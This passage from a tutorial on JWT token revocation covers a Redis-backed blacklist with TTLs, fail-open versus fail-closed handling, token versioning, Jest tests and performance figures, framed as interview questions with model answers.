  const exists = await db.query('SELECT * FROM tokens WHERE token = ?', [token]);
  
  if (!exists) return res.status(401).json({ error: 'Invalid' });
  
  req.user = decoded;
  next();
});

// Problem:
// Defeats entire purpose of JWT (stateless)!
// Database query on EVERY request
// Just use sessions at this point!
```

### Production Approach:

```javascript
// Blacklist with Redis + TTL
app.post('/api/auth/logout', async (req, res) => {
  const token = extractToken(req);
  const decoded = verifyToken(token);
  
  const expiresIn = decoded.exp - Math.floor(Date.now() / 1000);
  await blacklist.addToBlacklist(decoded.jti, expiresIn);
  
  res.json({ success: true });
});

app.use(async (req, res, next) => {
  const token = extractToken(req);
  const decoded = jwt.verify(token, publicKey);
  
  // Check blacklist (Redis, 1-2ms)
  const isBlacklisted = await blacklist.isBlacklisted(decoded.jti);
  
  if (isBlacklisted) {
    return res.status(401).json({ error: 'Token revoked' });
  }
  
  req.user = decoded;
  next();
});

// Benefits:
// ✅ Fast (Redis 1-2ms vs database 10-50ms)
// ✅ Mostly stateless (only check on logout, rare)
// ✅ Auto-cleanup (TTL)
// ✅ Scales horizontally (Redis shared)
```

---

## Interview Questions

### Q1: "How do you revoke JWT tokens?"

**Perfect Answer:**

"JWTs are stateless and self-contained, which makes revocation challenging. I use a Redis-backed blacklist approach:

**On logout:**
1. Extract jti (JWT ID) from token
2. Calculate time until token expiry
3. Add jti to Redis with TTL matching remaining lifetime: `SET blacklist:{jti} 'revoked' EX {seconds}`

**On authentication:**
1. Verify token signature and expiry
2. Check if jti exists in Redis blacklist
3. If blacklisted, reject with 401 TOKEN_REVOKED

**Why this works:**

**Fast:** Redis query is 1-2ms vs database 10-50ms

**Scales:** Redis shared across all gateway instances

**Auto-cleanup:** TTL expires when token expires naturally, no memory leak

**Mostly stateless:** Only check blacklist, don't store all valid tokens

**Trade-offs:**

Adds Redis dependency and ~2ms latency per request. If Redis fails, I fail open (accept tokens) to maintain availability, since tokens expire in 15 minutes anyway.

For high-traffic APIs, I'd add a 1-second local cache to reduce Redis load by 99%+, accepting a 1-second revocation delay.

Alternative approaches: Token versioning (increment user.tokenVersion on revoke, check token.version === user.version), but this requires database query per request."

---

### Q2: "What happens if Redis goes down?"

**Perfect Answer:**

"If Redis is unavailable, I have to choose between security (fail closed) and availability (fail open):

**Fail Closed (reject all tokens):**
```javascript
try {
  return await redisClient.get(key) !== null;
} catch (error) {
  return true; // Assume blacklisted = deny access
}
```
- Pros: Maximum security, no revoked tokens get through
- Cons: Complete auth outage if Redis down

**Fail Open (accept all tokens):**
```javascript
try {
  return await redisClient.get(key) !== null;
} catch (error) {
  return false; // Assume not blacklisted = maintain availability
}
```
- Pros: System remains available during Redis outage
- Cons: Revoked tokens temporarily accepted

**I choose fail open because:**

1. Short token expiry (15 min) limits damage window
2. Redis is highly available (99.9%+ uptime)
3. Complete auth failure unacceptable for most apps
4. Can monitor Redis health and alert on failures

**Additional mitigations:**

**Redis HA:** Use Redis Sentinel or Cluster for automatic failover

**Circuit breaker:** If Redis consistently failing, stop querying it temporarily

**Monitoring:** Alert on Redis downtime for manual investigation

**Fallback TTL:** During outage, accept tokens only if issued <5 minutes ago (reduce risk)

For high-security applications (banking, healthcare), I'd fail closed and ensure Redis HA with multiple replicas and automatic failover."

---

### Q3: "Why store jti instead of the entire token in blacklist?"

**Perfect Answer:**

"Storing just the jti (JWT ID) is more efficient:

**Storing entire token (BAD):**
```javascript
// Token size: ~600 bytes
const token = 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEy...';
await redis.set(`blacklist:${token}`, 'revoked', 'EX', 900);

// At 1000 logouts/hour:
// 1000 × 600 bytes = 600 KB/hour in Redis
// After 24 hours: 14.4 MB just for blacklist
```

**Storing jti (GOOD):**
```javascript
// jti size: 36 bytes (UUID)
const jti = '550e8400-e29b-41d4-a716-446655440000';
await redis.set(`blacklist:${jti}`, 'revoked', 'EX', 900);

// At 1000 logouts/hour:
// 1000 × 36 bytes = 36 KB/hour in Redis
// After 24 hours: 864 KB (17x less memory!)
```

**Benefits of jti:**

1. **Smaller:** 36 bytes vs 600 bytes (94% reduction)
2. **Faster lookup:** Smaller keys = faster Redis operations
3. **Standard:** jti is standard JWT claim designed for revocation
4. **Unique:** UUIDv4 collision probability is negligible

**Security:**

Some worry: 'If attacker knows jti, can they forge token?'

No! jti is just an identifier. To create valid token, attacker needs:
- Private key (for signing)
- User data (userId, email, role)
- Correct signature

Knowing jti alone is useless for forgery.

**Alternative:**

Some use hash of token: `SHA256(token)` → 64 hex chars = 32 bytes. Similar efficiency but adds hashing overhead. jti is simpler and built into JWT standard."

---

### Q4: "How do you blacklist all user's tokens?"

**Perfect Answer:**

"Blacklisting all user tokens requires tracking which tokens belong to each user:

**For access tokens:**

Access tokens are short-lived and not stored, so I can't enumerate them. Instead, I use a token version approach:

```javascript
// 1. Store tokenVersion in database
CREATE TABLE users (
  id INT,
  token_version INT DEFAULT 0
);

// 2. Include version in token
const token = jwt.sign({
  userId: 123,
  tokenVersion: user.token_version
}, privateKey);

// 3. On authentication, check version matches
const decoded = verifyToken(token);
const user = await db.query('SELECT token_version FROM users WHERE id = ?', 
  [decoded.userId]);

if (decoded.tokenVersion !== user.token_version) {
  throw new Error('Token version mismatch');
}

// 4. To revoke all user tokens: increment version
await db.query('UPDATE users SET token_version = token_version + 1 WHERE id = ?', 
  [userId]);
// All existing tokens now have wrong version!
```

**For refresh tokens:**

Refresh tokens ARE stored in database, so I can enumerate and blacklist them:

```javascript
async function revokeAllUserTokens(userId) {
  // 1. Get all user's refresh tokens from database
  const tokens = await db.query(
    'SELECT token_id, expires_at FROM refresh_tokens WHERE user_id = ?',
    [userId]
  );
  
  // 2. Blacklist each token
  const now = Math.floor(Date.now() / 1000);
  await Promise.all(tokens.map(token => {
    const expiresIn = token.expires_at - now;
    if (expiresIn > 0) {
      return blacklist.addToBlacklist(token.token_id, expiresIn);
    }
  }));
  
  // 3. Delete from database
  await db.query('DELETE FROM refresh_tokens WHERE user_id = ?', [userId]);
  
  // 4. Increment token version (for access tokens)
  await db.query('UPDATE users SET token_version = token_version + 1 WHERE id = ?',
    [userId]);
}
```

**Use cases:**
- User reports account compromise
- Password change
- Role/permissions change
- Account suspension
- Admin action

**Trade-off:** Token version check adds database query, but only for high-security scenarios."

---

### Q5: "How do you test token blacklist?"

**Perfect Answer:**

"I test blacklist functionality at multiple levels:

**Unit tests (mock Redis):**

```javascript
jest.mock('redis', () => ({
  createClient: () => ({
    get: jest.fn(),
    setEx: jest.fn(),
    del: jest.fn()
  })
}));

describe('blacklist', () => {
  test('addToBlacklist stores with TTL', async () => {
    await blacklist.addToBlacklist('abc-123', 900);
    
    expect(redisClient.setEx).toHaveBeenCalledWith(
      'blacklist:abc-123',
      900,
      'revoked'
    );
  });
  
  test('isBlacklisted returns true for blacklisted token', async () => {
    redisClient.get.mockResolvedValue('revoked');
    
    const result = await blacklist.isBlacklisted('abc-123');
    
    expect(result).toBe(true);
  });
  
  test('isBlacklisted returns false for valid token', async () => {
    redisClient.get.mockResolvedValue(null);
    
    const result = await blacklist.isBlacklisted('abc-123');
    
    expect(result).toBe(false);
  });
});
```

**Integration tests (real Redis):**

```javascript
describe('blacklist integration', () => {
  beforeEach(async () => {
    await redisClient.flushDb(); // Clear test database
  });
  
  test('full logout flow', async () => {
    // 1. Login
    const loginRes = await request(app)
      .post('/api/auth/login')
      .send({ email: 'test@test.com', password: 'password' });
    
    const token = loginRes.body.accessToken;
    
    // 2. Verify can access protected route
    const profileRes = await request(app)
      .get('/api/profile')
      .set('Authorization', `Bearer ${token}`);
    
    expect(profileRes.status).toBe(200);
    
    // 3. Logout (blacklist token)
    await request(app)
      .post('/api/auth/logout')
      .set('Authorization', `Bearer ${token}`)
      .send({ refreshToken: loginRes.body.refreshToken });
    
    // 4. Verify token now rejected
    const profileRes2 = await request(app)
      .get('/api/profile')
      .set('Authorization', `Bearer ${token}`);
    
    expect(profileRes2.status).toBe(401);
    expect(profileRes2.body.error.code).toBe('TOKEN_REVOKED');
  });
  
  test('blacklist entry expires with TTL', async () => {
    // Add with 2-second TTL
    await blacklist.addToBlacklist('test-token', 2);
    
    // Immediately blacklisted
    expect(await blacklist.isBlacklisted('test-token')).toBe(true);
    
    // Wait 3 seconds
    await new Promise(resolve => setTimeout(resolve, 3000));
    
    // No longer blacklisted (TTL expired)
    expect(await blacklist.isBlacklisted('test-token')).toBe(false);
  });
});
```

**End-to-end tests:**

Test Redis failover, fail open/closed behavior, performance under load."

---

## Production Metrics

**Blacklist Performance:**

```
Logout rate: 100 logouts/minute (typical)
Token expiry: 15 minutes average

Redis operations:
├─ Writes (blacklist on logout): 100/min = ~2/sec
├─ Reads (check on every request): 10,000/min = ~167/sec
└─ Memory: 100 × 36 bytes × 15 min = 54 KB

Redis latency:
├─ GET (check blacklist): 1-2ms P50, 3-5ms P99
├─ SETEX (add to blacklist): 1-2ms P50, 3-5ms P99
└─ Negligible impact on request latency

With local 1-second cache:
├─ Cache hit rate: 95%+
├─ Redis queries: 167/sec → 8/sec (95% reduction!)
└─ Latency: 0.01ms for cache hits

Memory usage (1000 concurrent users, 15min tokens):
├─ Without cache: 36 KB (just Redis)
├─ With cache: 36 KB (Redis) + 72 KB (local) = 108 KB total
└─ Negligible memory overhead ✅
```

---

## Next: Rate Limiting

**Component 3 complete!** You now understand token blacklist deeply - how to revoke JWTs, Redis TTL strategy, and fail open/closed decisions.

**Next up:** Component 4 - Rate Limiting (token bucket algorithm, Redis-backed distributed rate limiting!)

This is the final component of authentication. Ready? 🚀